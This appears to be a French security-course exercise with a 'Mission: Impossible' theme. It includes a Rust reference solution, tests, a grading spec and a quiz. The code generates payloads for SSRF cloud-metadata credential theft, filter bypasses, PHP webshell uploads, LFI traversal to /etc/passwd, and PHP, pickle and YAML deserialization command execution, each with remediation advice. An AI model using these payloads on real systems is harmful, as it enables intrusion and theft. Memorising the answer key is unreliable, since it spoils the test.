# Exercice 3.3.9-a : ssrf_server_side_exploitation

**Module :**
3.3.9 â€” Server-Side Vulnerabilities

**Concept :**
a â€” SSRF & Server-Side Exploitation (SSRF, File Upload, LFI/RFI, Deserialization)

**DifficultÃ© :**
â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜† (9/10)

**Type :**
pratique

**Tiers :**
2 â€” MÃ©lange (concepts a + b + c + d + e)

**Langage :**
Rust Edition 2024

**PrÃ©requis :**
- Protocoles rÃ©seau (HTTP, DNS, TCP)
- Architecture Cloud (AWS, GCP, Azure)
- Encodages IP (dÃ©cimal, hexadÃ©cimal, IPv6)
- SÃ©rialisation (JSON, XML, pickle, PHP serialize)

**Domaines :**
Net, FS, Encodage, Crypto

**DurÃ©e estimÃ©e :**
360 min

**XP Base :**
450

**ComplexitÃ© :**
T4 O(n Ã— m) Ã— S3 O(n)

---

## ğŸ“ SECTION 1 : PROTOTYPE & CONSIGNE

### 1.1 Obligations

**Fichier Ã  rendre :**
`ssrf_server_side_exploitation.rs`

**Fonctions autorisÃ©es :**
- `serde_json` pour le parsing JSON
- `regex` pour la dÃ©tection de patterns
- Fonctions standard Rust

**Fonctions interdites :**
- RequÃªtes HTTP rÃ©elles
- AccÃ¨s fichiers systÃ¨me

---

### 1.2 Consigne

#### ğŸ¬ CONTEXTE FUN â€” "Mission: Impossible"

*"Your mission, should you choose to accept it..."*

Tu es **Ethan Hunt**, et ta mission cette fois n'est pas de t'infiltrer physiquement dans un bÃ¢timent sÃ©curisÃ© â€” c'est d'infiltrer le **rÃ©seau interne** d'une organisation depuis l'extÃ©rieur. Le problÃ¨me ? Les firewalls bloquent tout accÃ¨s direct.

Mais tu as trouvÃ© une faille : un endpoint qui fait des requÃªtes HTTP pour toi. C'est comme avoir un **agent infiltrÃ©** Ã  l'intÃ©rieur qui peut accÃ©der Ã  tout. **SSRF** - Server-Side Request Forgery.

**Tes missions d'infiltration :**
- **SSRF** : Faire faire des requÃªtes par le serveur vers des cibles internes
- **Cloud Metadata** : Voler les credentials AWS/GCP/Azure depuis l'intÃ©rieur
- **File Upload** : DÃ©poser un webshell dÃ©guisÃ©
- **LFI/RFI** : Lire des fichiers sensibles ou inclure du code distant
- **Deserialization** : ExÃ©cuter du code via des objets malveillants

*"This message will self-destruct in 5 seconds."*

---

#### 1.2.2 Ã‰noncÃ© AcadÃ©mique

**Ta mission :**

Ã‰crire une fonction `ssrf_server_side_exploitation` qui analyse des endpoints vulnÃ©rables et gÃ©nÃ¨re des payloads d'exploitation pour diffÃ©rentes attaques server-side.

**EntrÃ©e (JSON) :**
- `vulnerability_type` : Type (SSRF, FILE_UPLOAD, LFI, RFI, DESERIALIZATION, RACE_CONDITION)
- `endpoint` : Endpoint vulnÃ©rable
- `parameter` : ParamÃ¨tre injectable
- `cloud_environment` : Environnement cloud (AWS, GCP, Azure, null)
- `blocked_patterns` : Liste des patterns bloquÃ©s
- `allowed_protocols` : Protocoles autorisÃ©s

**Sortie (JSON) :**
- `vulnerability_analysis` : Analyse dÃ©taillÃ©e
  - `internal_targets` : Cibles internes potentielles
  - `bypass_techniques` : Techniques de contournement
- `exploitation_chain` : ChaÃ®ne d'exploitation Ã©tape par Ã©tape
- `payloads` : Payloads gÃ©nÃ©rÃ©s
- `impact` : Ã‰valuation de l'impact
  - `severity` : GravitÃ© (LOW, MEDIUM, HIGH, CRITICAL)
  - `assets_at_risk` : Assets Ã  risque
  - `cwe` : Code CWE
- `remediation` : Recommandations

**Contraintes :**
- GÃ©nÃ©rer des bypass pour les filtres IP courants
- Adapter les payloads au cloud provider
- Proposer des chaÃ®nes d'exploitation rÃ©alistes
- Ã‰valuer l'impact business

---

### 1.3 Prototype

```rust
/// SSRF & Server-Side Exploitation - Ethan Hunt's Internal Access
///
/// GÃ©nÃ¨re des payloads et chaÃ®nes d'exploitation pour SSRF, File Upload,
/// LFI/RFI, Deserialization et Race Conditions.
///
/// # Arguments
/// * `input_json` - Configuration JSON
///
/// # Returns
/// * JSON string avec vulnerability_analysis, exploitation_chain, payloads, impact
pub fn ssrf_server_side_exploitation(input_json: &str) -> String
```

---

## ğŸ’¡ SECTION 2 : LE SAVIEZ-VOUS ?

### 2.1 Capital One Breach (2019)

L'une des plus grandes breaches de l'histoire a Ã©tÃ© causÃ©e par SSRF. L'attaquant a exploitÃ© un WAF mal configurÃ© pour faire des requÃªtes vers le metadata service AWS, obtenant des credentials IAM qui ont permis d'accÃ©der aux donnÃ©es de **106 millions de clients**.

CoÃ»t : $80 million d'amende + $300 million estimÃ©s en dommages.

### 2.2 Cloud Metadata : La mine d'or

Tous les cloud providers exposent un service de metadata sur une IP interne :
- **AWS** : `169.254.169.254`
- **GCP** : `169.254.169.254` (avec header Metadata-Flavor: Google)
- **Azure** : `169.254.169.254` (avec header Metadata: true)

Ce service contient les **credentials temporaires** du rÃ´le IAM attachÃ© Ã  l'instance.

### 2.3 IP Bypass : L'art de l'obfuscation

```
169.254.169.254 peut Ãªtre reprÃ©sentÃ© comme :
- DÃ©cimal : 2852039166
- HexadÃ©cimal : 0xa9fea9fe
- Octal : 0251.0376.0251.0376
- IPv6 mapped : ::ffff:169.254.169.254
- URL encoded : %31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34
- DNS rebinding : attacker.com (rÃ©sout vers 169.254.169.254)
```

---

### 2.5 DANS LA VRAIE VIE

| MÃ©tier | Utilisation |
|--------|-------------|
| **Cloud Security Engineer** | Configure IMDSv2, network policies |
| **Pentester** | Teste systÃ©matiquement SSRF sur chaque application |
| **Bug Bounty** | SSRF to cloud credentials = $10K-$100K bounty |
| **Red Team** | SSRF est souvent le premier foothold |
| **SOC Analyst** | DÃ©tecte les accÃ¨s anormaux au metadata service |

---

## ğŸ–¥ï¸ SECTION 3 : EXEMPLE D'UTILISATION

### 3.0 Session bash

```bash
$ cargo run
Test 1 - SSRF Basic (AWS):
  Target: 169.254.169.254 (blocked)
  Bypass: 2852039166 (decimal) âœ“
  Bypass: [::ffff:169.254.169.254] (IPv6) âœ“
  Chain: Metadata â†’ IAM Role â†’ Credentials

Test 2 - SSRF with DNS:
  Bypass: DNS rebinding via attacker-controlled domain

Test 3 - File Upload:
  Bypass: Double extension (.php.jpg)
  Bypass: Content-Type manipulation
  Bypass: Magic bytes injection

Test 4 - LFI:
  Payloads: ../../etc/passwd, php://filter/...

Test 5 - Deserialization (PHP):
  Payload: O:8:"Malicious":1:{s:4:"cmd";s:6:"whoami";}

All server-side exploitation tests completed!
```

---

## âœ…âŒ SECTION 4 : ZONE CORRECTION

### 4.1 Moulinette

| Test | EntrÃ©e | Sortie Attendue | Points |
|------|--------|-----------------|--------|
| `test_ssrf_aws_bypass` | SSRF AWS bloquÃ© | Bypass dÃ©cimal/IPv6 | 20 |
| `test_ssrf_gcp_header` | SSRF GCP | Header Metadata-Flavor | 15 |
| `test_ssrf_internal_services` | SSRF interne | Redis/Elasticsearch targets | 15 |
| `test_file_upload_bypass` | Upload bloquÃ© | Double extension, magic bytes | 15 |
| `test_lfi_payloads` | LFI basique | Wrappers PHP, null byte | 15 |
| `test_deserialization_php` | PHP unserialize | Payload gadget chain | 15 |
| `test_impact_assessment` | Toute vuln | Severity + assets | 10 |
| `test_exploitation_chain` | SSRF AWS | ChaÃ®ne complÃ¨te | 10 |

**Total : 115 points**

---

### 4.2 main.rs de test

```rust
use serde_json::{json, Value};

mod ssrf_server_side_exploitation;
use ssrf_server_side_exploitation::ssrf_server_side_exploitation;

fn main() {
    println!("=== SSRF & Server-Side Exploitation - Test Runner ===\n");

    // Test 1: SSRF AWS with blocked patterns
    let test_ssrf = json!({
        "vulnerability_type": "SSRF",
        "endpoint": "POST /fetch-url",
        "parameter": "url",
        "cloud_environment": "AWS",
        "blocked_patterns": ["169.254.169.254", "localhost", "127.0.0.1"],
        "allowed_protocols": ["http", "https"]
    });

    let result = ssrf_server_side_exploitation(&test_ssrf.to_string());
    let parsed: Value = serde_json::from_str(&result).expect("Invalid JSON");

    assert!(parsed["vulnerability_analysis"]["bypass_techniques"]
        .as_array()
        .map(|a| a.len() > 0)
        .unwrap_or(false));
    println!("âœ“ Test 1 - SSRF AWS Bypass: PASSED");

    // Test 2: File Upload
    let test_upload = json!({
        "vulnerability_type": "FILE_UPLOAD",
        "endpoint": "POST /upload",
        "parameter": "file",
        "restrictions": {
            "allowed_extensions": [".jpg", ".png", ".gif"],
            "content_type_check": true,
            "magic_bytes_check": false
        }
    });

    let result = ssrf_server_side_exploitation(&test_upload.to_string());
    let parsed: Value = serde_json::from_str(&result).unwrap();

    assert!(parsed["payloads"].as_array().unwrap().len() > 0);
    println!("âœ“ Test 2 - File Upload Bypass: PASSED");

    // Test 3: LFI
    let test_lfi = json!({
        "vulnerability_type": "LFI",
        "endpoint": "GET /read",
        "parameter": "file",
        "base_path": "/var/www/html/",
        "language": "PHP"
    });

    let result = ssrf_server_side_exploitation(&test_lfi.to_string());
    let parsed: Value = serde_json::from_str(&result).unwrap();

    assert!(parsed["payloads"].as_array()
        .unwrap()
        .iter()
        .any(|p| p.as_str().unwrap().contains("../")));
    println!("âœ“ Test 3 - LFI Payloads: PASSED");

    // Test 4: Deserialization
    let test_deser = json!({
        "vulnerability_type": "DESERIALIZATION",
        "endpoint": "POST /api/import",
        "parameter": "data",
        "serialization_format": "PHP"
    });

    let result = ssrf_server_side_exploitation(&test_deser.to_string());
    let parsed: Value = serde_json::from_str(&result).unwrap();

    assert!(parsed["payloads"].as_array()
        .unwrap()
        .iter()
        .any(|p| p.as_str().unwrap().contains("O:")));
    println!("âœ“ Test 4 - Deserialization Payload: PASSED");

    // Test 5: Impact assessment
    assert!(parsed.get("impact").is_some());
    println!("âœ“ Test 5 - Impact Assessment: PASSED");

    println!("\n=== Mission Accomplished! ===");
}
```

---

### 4.3 Solution de rÃ©fÃ©rence

```rust
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::collections::HashMap;

#[derive(Debug, Deserialize)]
struct Input {
    vulnerability_type: String,
    endpoint: Option<String>,
    parameter: Option<String>,
    cloud_environment: Option<String>,
    blocked_patterns: Option<Vec<String>>,
    allowed_protocols: Option<Vec<String>>,
    restrictions: Option<Value>,
    base_path: Option<String>,
    language: Option<String>,
    serialization_format: Option<String>,
}

#[derive(Debug, Serialize)]
struct Output {
    vulnerability_analysis: VulnerabilityAnalysis,
    exploitation_chain: Vec<String>,
    payloads: Vec<String>,
    impact: Impact,
    remediation: Vec<String>,
}

#[derive(Debug, Serialize)]
struct VulnerabilityAnalysis {
    internal_targets: Vec<String>,
    bypass_techniques: Vec<BypassTechnique>,
    conditions: String,
}

#[derive(Debug, Serialize)]
struct BypassTechnique {
    blocked: String,
    bypass: String,
    technique: String,
}

#[derive(Debug, Serialize)]
struct Impact {
    severity: String,
    assets_at_risk: String,
    cwe: String,
    owasp: String,
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// SSRF ANALYSIS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

fn analyze_ssrf(input: &Input) -> Output {
    let blocked = input.blocked_patterns.as_ref().map(|v| v.as_slice()).unwrap_or(&[]);
    let cloud = input.cloud_environment.as_deref().unwrap_or("unknown");

    // Generate IP bypass techniques
    let mut bypass_techniques = Vec::new();

    // 169.254.169.254 bypasses
    if blocked.iter().any(|b| b.contains("169.254.169.254")) {
        bypass_techniques.push(BypassTechnique {
            blocked: "169.254.169.254".to_string(),
            bypass: "2852039166".to_string(),
            technique: "Decimal IP notation".to_string(),
        });
        bypass_techniques.push(BypassTechnique {
            blocked: "169.254.169.254".to_string(),
            bypass: "0xa9fea9fe".to_string(),
            technique: "Hexadecimal IP".to_string(),
        });
        bypass_techniques.push(BypassTechnique {
            blocked: "169.254.169.254".to_string(),
            bypass: "[::ffff:169.254.169.254]".to_string(),
            technique: "IPv6 mapped IPv4".to_string(),
        });
        bypass_techniques.push(BypassTechnique {
            blocked: "169.254.169.254".to_string(),
            bypass: "169.254.169.254.xip.io".to_string(),
            technique: "DNS wildcard service".to_string(),
        });
    }

    // localhost bypasses
    if blocked.iter().any(|b| b.contains("localhost") || b.contains("127.0.0.1")) {
        bypass_techniques.push(BypassTechnique {
            blocked: "localhost/127.0.0.1".to_string(),
            bypass: "127.1".to_string(),
            technique: "Shortened localhost".to_string(),
        });
        bypass_techniques.push(BypassTechnique {
            blocked: "localhost/127.0.0.1".to_string(),
            bypass: "0".to_string(),
            technique: "0 resolves to localhost".to_string(),
        });
        bypass_techniques.push(BypassTechnique {
            blocked: "localhost/127.0.0.1".to_string(),
            bypass: "[::1]".to_string(),
            technique: "IPv6 localhost".to_string(),
        });
    }

    // Internal targets based on cloud
    let internal_targets = match cloud {
        "AWS" => vec![
            "http://2852039166/latest/meta-data/".to_string(),
            "http://[::ffff:169.254.169.254]/latest/meta-data/".to_string(),
            "http://169.254.169.254.xip.io/latest/meta-data/".to_string(),
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/".to_string(),
            "http://169.254.169.254/latest/user-data/".to_string(),
        ],
        "GCP" => vec![
            "http://metadata.google.internal/computeMetadata/v1/".to_string(),
            "http://169.254.169.254/computeMetadata/v1/".to_string(),
            "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token".to_string(),
        ],
        "Azure" => vec![
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01".to_string(),
            "http://169.254.169.254/metadata/identity/oauth2/token".to_string(),
        ],
        _ => vec![
            "http://127.0.0.1:6379/".to_string(),  // Redis
            "http://127.0.0.1:9200/".to_string(),  // Elasticsearch
            "http://127.0.0.1:11211/".to_string(), // Memcached
            "http://127.0.0.1:27017/".to_string(), // MongoDB
        ],
    };

    // Exploitation chain
    let exploitation_chain = match cloud {
        "AWS" => vec![
            "1. Bypass IP filter using decimal notation: 2852039166".to_string(),
            "2. Access http://2852039166/latest/meta-data/iam/security-credentials/".to_string(),
            "3. Extract IAM role name from response".to_string(),
            "4. Access /latest/meta-data/iam/security-credentials/{role-name}".to_string(),
            "5. Extract AccessKeyId, SecretAccessKey, and Token".to_string(),
            "6. Use credentials to access AWS services (S3, EC2, etc.)".to_string(),
        ],
        "GCP" => vec![
            "1. Add header: Metadata-Flavor: Google".to_string(),
            "2. Access /computeMetadata/v1/instance/service-accounts/default/token".to_string(),
            "3. Extract access_token from JSON response".to_string(),
            "4. Use token to access Google Cloud APIs".to_string(),
        ],
        _ => vec![
            "1. Scan internal network for services".to_string(),
            "2. Identify exposed services (Redis, Elasticsearch)".to_string(),
            "3. Exploit service-specific vulnerabilities".to_string(),
        ],
    };

    // Generate payloads
    let payloads = internal_targets.clone();

    Output {
        vulnerability_analysis: VulnerabilityAnalysis {
            internal_targets,
            bypass_techniques,
            conditions: "Server makes HTTP requests based on user input".to_string(),
        },
        exploitation_chain,
        payloads,
        impact: Impact {
            severity: "CRITICAL".to_string(),
            assets_at_risk: format!("{} credentials, internal services, full cloud account compromise", cloud),
            cwe: "CWE-918".to_string(),
            owasp: "A10:2021 - Server-Side Request Forgery".to_string(),
        },
        remediation: vec![
            "Use allowlist for URLs/domains instead of blocklist".to_string(),
            "Disable unnecessary URL schemes (file://, gopher://, dict://)".to_string(),
            "Use network segmentation to isolate sensitive services".to_string(),
            "Enable IMDSv2 on AWS (requires session token)".to_string(),
            "Block metadata IP at network level".to_string(),
        ],
    }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// FILE UPLOAD ANALYSIS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

fn analyze_file_upload(input: &Input) -> Output {
    let restrictions = input.restrictions.as_ref();

    let mut bypass_techniques = Vec::new();
    let mut payloads = Vec::new();

    // Extension bypass
    bypass_techniques.push(BypassTechnique {
        blocked: ".php".to_string(),
        bypass: "shell.php.jpg".to_string(),
        technique: "Double extension".to_string(),
    });
    bypass_techniques.push(BypassTechnique {
        blocked: ".php".to_string(),
        bypass: "shell.pHp".to_string(),
        technique: "Case variation".to_string(),
    });
    bypass_techniques.push(BypassTechnique {
        blocked: ".php".to_string(),
        bypass: "shell.php%00.jpg".to_string(),
        technique: "Null byte injection (old PHP)".to_string(),
    });
    bypass_techniques.push(BypassTechnique {
        blocked: ".php".to_string(),
        bypass: "shell.php;.jpg".to_string(),
        technique: "Semicolon bypass (Apache)".to_string(),
    });

    // Content-Type bypass
    bypass_techniques.push(BypassTechnique {
        blocked: "Content-Type check".to_string(),
        bypass: "image/jpeg with PHP content".to_string(),
        technique: "Content-Type spoofing".to_string(),
    });

    // Magic bytes bypass
    bypass_techniques.push(BypassTechnique {
        blocked: "Magic bytes check".to_string(),
        bypass: "GIF89a + PHP code".to_string(),
        technique: "Prepend valid image header".to_string(),
    });

    // Generate payloads
    payloads.push("shell.php.jpg".to_string());
    payloads.push("shell.pHp".to_string());
    payloads.push("shell.php5".to_string());
    payloads.push("shell.phtml".to_string());
    payloads.push(".htaccess (AddType application/x-httpd-php .jpg)".to_string());
    payloads.push("GIF89a<?php system($_GET['cmd']); ?>".to_string());

    Output {
        vulnerability_analysis: VulnerabilityAnalysis {
            internal_targets: vec!["Upload directory".to_string(), "Web root".to_string()],
            bypass_techniques,
            conditions: "Server allows file uploads with weak validation".to_string(),
        },
        exploitation_chain: vec![
            "1. Identify allowed extensions and content types".to_string(),
            "2. Craft payload with bypass technique".to_string(),
            "3. Upload file (shell.php.jpg)".to_string(),
            "4. Find uploaded file location".to_string(),
            "5. Access file to execute code".to_string(),
            "6. Establish persistence / reverse shell".to_string(),
        ],
        payloads,
        impact: Impact {
            severity: "CRITICAL".to_string(),
            assets_at_risk: "Remote Code Execution, full server compromise".to_string(),
            cwe: "CWE-434".to_string(),
            owasp: "A03:2021 - Injection".to_string(),
        },
        remediation: vec![
            "Validate file content, not just extension/content-type".to_string(),
            "Store uploads outside web root".to_string(),
            "Rename uploaded files with random names".to_string(),
            "Use Content-Disposition: attachment for downloads".to_string(),
            "Scan uploads with antivirus".to_string(),
        ],
    }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// LFI ANALYSIS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

fn analyze_lfi(input: &Input) -> Output {
    let language = input.language.as_deref().unwrap_or("PHP");

    let mut payloads = vec![
        "../../../etc/passwd".to_string(),
        "....//....//....//etc/passwd".to_string(),
        "..%2f..%2f..%2fetc/passwd".to_string(),
        "..%252f..%252f..%252fetc/passwd".to_string(),
        "/etc/passwd%00".to_string(),
    ];

    // PHP-specific wrappers
    if language == "PHP" {
        payloads.push("php://filter/convert.base64-encode/resource=index.php".to_string());
        payloads.push("php://input".to_string());
        payloads.push("data://text/plain,<?php system('id'); ?>".to_string());
        payloads.push("expect://id".to_string());
        payloads.push("phar://uploads/evil.phar/test".to_string());
    }

    // Log poisoning
    payloads.push("/var/log/apache2/access.log".to_string());
    payloads.push("/var/log/nginx/access.log".to_string());
    payloads.push("/proc/self/environ".to_string());

    Output {
        vulnerability_analysis: VulnerabilityAnalysis {
            internal_targets: vec![
                "/etc/passwd".to_string(),
                "/etc/shadow".to_string(),
                "Application source code".to_string(),
                "Configuration files".to_string(),
            ],
            bypass_techniques: vec![
                BypassTechnique {
                    blocked: "../".to_string(),
                    bypass: "....//".to_string(),
                    technique: "Double dot bypass".to_string(),
                },
                BypassTechnique {
                    blocked: "../".to_string(),
                    bypass: "%2e%2e%2f".to_string(),
                    technique: "URL encoding".to_string(),
                },
                BypassTechnique {
                    blocked: "extension check".to_string(),
                    bypass: "file.php%00".to_string(),
                    technique: "Null byte (old PHP)".to_string(),
                },
            ],
            conditions: "Server includes files based on user input".to_string(),
        },
        exploitation_chain: vec![
            "1. Test basic path traversal: ../../../etc/passwd".to_string(),
            "2. If blocked, try encoding: %2e%2e%2f".to_string(),
            "3. Use PHP wrappers for source disclosure".to_string(),
            "4. Poison logs with PHP code in User-Agent".to_string(),
            "5. Include poisoned log for RCE".to_string(),
        ],
        payloads,
        impact: Impact {
            severity: "HIGH".to_string(),
            assets_at_risk: "Source code disclosure, configuration files, potential RCE via log poisoning".to_string(),
            cwe: "CWE-22".to_string(),
            owasp: "A01:2021 - Broken Access Control".to_string(),
        },
        remediation: vec![
            "Use allowlist for includable files".to_string(),
            "Never use user input directly in include/require".to_string(),
            "Use realpath() and verify within allowed directory".to_string(),
            "Disable PHP wrappers: allow_url_include=Off".to_string(),
        ],
    }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// DESERIALIZATION ANALYSIS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

fn analyze_deserialization(input: &Input) -> Output {
    let format = input.serialization_format.as_deref().unwrap_or("PHP");

    let mut payloads = Vec::new();

    match format {
        "PHP" => {
            payloads.push(r#"O:8:"Malicious":1:{s:4:"cmd";s:6:"whoami";}"#.to_string());
            payloads.push(r#"O:14:"BadClass":1:{s:4:"file";s:11:"/etc/passwd";}"#.to_string());
            payloads.push("phar://uploads/evil.phar".to_string());
        }
        "Java" => {
            payloads.push("rO0ABXNy... (Commons Collections gadget)".to_string());
            payloads.push("ysoserial payload - CommonsCollections5".to_string());
        }
        "Python" => {
            payloads.push(r#"cos\nsystem\n(S'id'\ntR."#.to_string());
            payloads.push("pickle payload with __reduce__".to_string());
        }
        "YAML" => {
            payloads.push("!!python/object/apply:os.system ['id']".to_string());
        }
        _ => {}
    }

    Output {
        vulnerability_analysis: VulnerabilityAnalysis {
            internal_targets: vec!["Application memory".to_string(), "System commands".to_string()],
            bypass_techniques: vec![
                BypassTechnique {
                    blocked: "Known gadgets".to_string(),
                    bypass: "Custom gadget chain".to_string(),
                    technique: "Alternative POP chains".to_string(),
                },
            ],
            conditions: format!("{} unserialize() on user input", format),
        },
        exploitation_chain: vec![
            "1. Identify serialization format".to_string(),
            "2. Find available classes (gadgets)".to_string(),
            "3. Build POP (Property Oriented Programming) chain".to_string(),
            "4. Craft serialized payload".to_string(),
            "5. Send payload to vulnerable endpoint".to_string(),
            "6. Achieve RCE when deserialized".to_string(),
        ],
        payloads,
        impact: Impact {
            severity: "CRITICAL".to_string(),
            assets_at_risk: "Remote Code Execution".to_string(),
            cwe: "CWE-502".to_string(),
            owasp: "A08:2021 - Software and Data Integrity Failures".to_string(),
        },
        remediation: vec![
            "Never deserialize untrusted data".to_string(),
            "Use JSON instead of native serialization".to_string(),
            "Implement integrity checks (HMAC)".to_string(),
            "Use look-ahead deserialization".to_string(),
        ],
    }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// MAIN FUNCTION
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

pub fn ssrf_server_side_exploitation(input_json: &str) -> String {
    let input: Input = match serde_json::from_str(input_json) {
        Ok(i) => i,
        Err(e) => {
            return json!({
                "error": format!("Invalid input JSON: {}", e)
            }).to_string();
        }
    };

    let output = match input.vulnerability_type.to_uppercase().as_str() {
        "SSRF" => analyze_ssrf(&input),
        "FILE_UPLOAD" => analyze_file_upload(&input),
        "LFI" => analyze_lfi(&input),
        "RFI" => analyze_lfi(&input), // Similar to LFI with remote URLs
        "DESERIALIZATION" => analyze_deserialization(&input),
        unknown => {
            return json!({
                "error": format!("Unknown vulnerability type: {}", unknown)
            }).to_string();
        }
    };

    serde_json::to_string_pretty(&output).unwrap_or_else(|e| {
        json!({ "error": format!("Serialization error: {}", e) }).to_string()
    })
}
```

---

### 4.9 spec.json

```json
{
  "name": "ssrf_server_side_exploitation",
  "language": "rust",
  "version": "2024",
  "type": "pratique",
  "tier": 2,
  "tags": ["ssrf", "file-upload", "lfi", "deserialization", "phase3"],
  "passing_score": 70,

  "function": {
    "name": "ssrf_server_side_exploitation",
    "prototype": "pub fn ssrf_server_side_exploitation(input_json: &str) -> String",
    "return_type": "String"
  },

  "driver": {
    "edge_cases": [
      {
        "name": "ssrf_aws_bypass",
        "args": ["{\"vulnerability_type\":\"SSRF\",\"cloud_environment\":\"AWS\",\"blocked_patterns\":[\"169.254.169.254\"]}"],
        "expected_contains": "2852039166",
        "is_trap": true
      },
      {
        "name": "file_upload_double_ext",
        "args": ["{\"vulnerability_type\":\"FILE_UPLOAD\",\"restrictions\":{\"allowed_extensions\":[\".jpg\"]}}"],
        "expected_contains": ".php.jpg",
        "is_trap": true
      },
      {
        "name": "lfi_php_wrappers",
        "args": ["{\"vulnerability_type\":\"LFI\",\"language\":\"PHP\"}"],
        "expected_contains": "php://filter",
        "is_trap": true
      }
    ]
  }
}
```

---

### 4.10 Solutions Mutantes

#### Mutant A : Pas de bypass IPv6

```rust
// âŒ Oublie le bypass IPv6 mapped
fn generate_bypasses_mutant_a(blocked: &str) -> Vec<String> {
    vec!["2852039166".to_string()]  // Manque ::ffff:
}
```

#### Mutant B : Mauvais cloud metadata

```rust
// âŒ Mauvais header pour GCP
fn gcp_payload_mutant_b() -> String {
    "http://169.254.169.254/computeMetadata/v1/".to_string()
    // BUG: Manque header Metadata-Flavor: Google
}
```

---

## ğŸ§  SECTION 5 : COMPRENDRE

### 5.3 Visualisation ASCII

```
                        SSRF ATTACK FLOW

    ATTAQUANT              SERVEUR VULNÃ‰RABLE           METADATA SERVICE
                           (dans le cloud)              (interne)
        â”‚                        â”‚                           â”‚
        â”‚  POST /fetch-url       â”‚                           â”‚
        â”‚  url=http://2852039166 â”‚                           â”‚
        â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º â”‚                           â”‚
        â”‚                        â”‚                           â”‚
        â”‚                        â”‚ GET /latest/meta-data/    â”‚
        â”‚                        â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–ºâ”‚
        â”‚                        â”‚                           â”‚
        â”‚                        â”‚ â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€  â”‚
        â”‚                        â”‚     IAM Credentials!      â”‚
        â”‚                        â”‚                           â”‚
        â”‚  â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚                           â”‚
        â”‚    Credentials leaked! â”‚                           â”‚
        â”‚                        â”‚                           â”‚

    Le serveur fait la requÃªte DEPUIS l'intÃ©rieur du rÃ©seau
    â†’ AccÃ¨s aux ressources internes normalement inaccessibles
```

---

### 5.8 MnÃ©motechniques

#### ğŸ¬ MEME : "Mission: Impossible" â€” SSRF

*"Your mission, should you choose to accept it: access the internal network from the outside."*

Comme Ethan Hunt qui utilise un agent infiltrÃ© pour accomplir sa mission depuis l'intÃ©rieur, SSRF utilise le serveur vulnÃ©rable comme "agent" pour accÃ©der aux ressources internes.

```
Le serveur = ton agent infiltrÃ©
La requÃªte = les instructions secrÃ¨tes
Le metadata service = le coffre-fort
Les credentials = les documents classifiÃ©s
```

---

## ğŸ“ SECTION 7 : QCM

### Question 1
**Quel est l'IP du metadata service AWS ?**

- A) 192.168.1.1
- B) 10.0.0.1
- C) 169.254.169.254
- D) 172.16.0.1
- E) 127.0.0.1

**RÃ©ponse : C**

### Question 2
**Quelle reprÃ©sentation de 169.254.169.254 bypass le filtre string ?**

- A) localhost
- B) 2852039166
- C) aws.metadata.com
- D) 0.0.0.0

